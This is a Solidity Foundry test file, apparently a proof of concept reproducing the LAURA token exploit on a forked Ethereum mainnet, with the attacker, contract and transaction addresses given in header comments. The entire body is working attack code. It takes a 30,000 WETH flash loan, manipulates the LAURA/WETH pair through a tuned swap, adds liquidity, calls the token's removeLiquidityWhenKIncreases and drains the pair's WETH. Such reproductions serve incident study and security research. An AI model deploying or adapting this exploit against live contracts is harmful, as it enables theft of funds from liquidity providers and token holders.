// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../interface.sol";

// Happy New Year
// @KeyInfo - Total Lost : 12.340357077284305206 ETH (~$41.2K USD)
// Attacker : https://etherscan.io/address/0x25869347f7993c50410a9b9b9c48f37d79e12a36
// Attack Contract 0 : https://etherscan.io/address/0x2cad84c3d2e31bc6d630229901f421e6da5557ef
// Attack Contract 1 : https://etherscan.io/address/0x55877cf2f24286dba2acb64311beca39728fbd10
// Vulnerable Contract : https://etherscan.io/token/0x05641e33fd15baf819729df55500b07b82eb8e89
// Attack Tx : https://etherscan.io/tx/0xef34f4fdf03e403e3c94e96539354fb4fe0b79a5ec927eacc63bc04108dbf420
// @POC Author : [rotcivegaf](https://twitter.com/rotcivegaf)

// Contracts involved
address constant uniV2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant pairLAURA_WETH = 0xb292678438245Ec863F9FEa64AFfcEA887144240;
address constant balancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
uint256 constant LOAN_AMOUNT = 30000 ether;

// This amount is used when calling `swapExactTokensForTokensSupportingFeeOnTransferTokens` and `addLiquidity` 
// from the uniV2Router
// It is enough so that when the `removeLiquidityWhenKIncreases` function of the LAURA contract is called,
// the LAURA balance of the WETH/LAURA pair will go down enough to be able to steal all the WETH from the pair
uint256 constant MAGIC_NUMBER = 11526249223479392795400;

contract LAURAToken_exp is Test {
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork("mainnet", 21_529_888 - 1);
    }

    function testPoC() public {
        vm.startPrank(attacker);
        AttackerC0 attC0 = new AttackerC0();

        console.log("Final balance in ETH :", address(attC0).balance);
    }
}

contract AttackerC0 {
    constructor () {
        AttackerC1 attC1 = new AttackerC1(); // L01

        attC1.attack();// L04
    }

    receive() external payable {}
}

contract AttackerC1 {
    constructor () {
        IFS(weth).approve(uniV2Router, type(uint256).max); // L02
    }

    function attack() external {
        address LAURA = IFS(pairLAURA_WETH).token0(); // L5
        // IFS(pairLAURA_WETH).token0(); // L6
        IFS(LAURA).approve(uniV2Router, type(uint256).max); // L7
        
        // L10
        address[] memory tokens = new address[](1);
        tokens[0] = weth;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = LOAN_AMOUNT;
        IFS(balancerVault).flashLoan(
            address(this),
            tokens,
            amounts,
            hex'000000000000000000000000b292678438245ec863f9fea64affcea887144240' // pairLAURA_WETH
        );

        uint256 bal0 = IERC20(weth).balanceOf(address(this)); // L112

        IFS(weth).withdraw(bal0); // L113

        (bool success,) = msg.sender.call{value: bal0}(""); // L116
        require(success, "Not success");
    }

    function receiveFlashLoan(
        IERC20[] memory,
        uint256[] memory,
        uint256[] memory,
        bytes memory
    ) external {
        address LAURA = IFS(pairLAURA_WETH).token0(); // L16
        //address weth = pairLAURA_WETH.token1(); // L17
        uint256 bal0 = IERC20(weth).balanceOf(address(this)); // L18
        uint256 bal1 = IERC20(weth).balanceOf(pairLAURA_WETH); // L19

        // L20
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = LAURA;
        IFS(uniV2Router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            MAGIC_NUMBER,     // amountIn
            0,                // amountOutMin
            path,             // path
            address(this),    // to
            type(uint256).max
        );
        
        uint256 bal2 = IERC20(LAURA).balanceOf(address(this)); // L38
        
        IFS(uniV2Router).addLiquidity( // L40
            LAURA,
            weth,
            bal2,
            MAGIC_NUMBER,
            0,
            0,
            address(this),
            type(uint256).max
        );

        IFS(LAURA).removeLiquidityWhenKIncreases(); // L57
        IFS(pairLAURA_WETH).approve(uniV2Router, type(uint256).max); // L66
        uint256 bal3 = IERC20(pairLAURA_WETH).balanceOf(address(this)); // L68

        IFS(uniV2Router).removeLiquidity( // L69
            LAURA,
            weth,
            bal3,
            0,
            0,
            address(this),
            type(uint256).max
        );

        uint256 bal4 = IERC20(LAURA).balanceOf(address(this)); // L88

        // L90
        path[0] = LAURA;
        path[1] = weth;
        IFS(uniV2Router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            bal4,
            0,
            path,
            address(this),
            type(uint256).max
        );
        IFS(weth).transfer(balancerVault, LOAN_AMOUNT); // L108
    }

    receive() external payable {}
}

interface IFS is IERC20 {
    // LAURA
    function removeLiquidityWhenKIncreases() external;

    // WETH
    function withdraw(
        uint256 wad
    ) external;

    // UniswapV2Pair
    function token0() external view returns (address);
    function token1() external view returns (address);

    // BalancerVault
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;

    // IUniswapV2Router02
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);
}

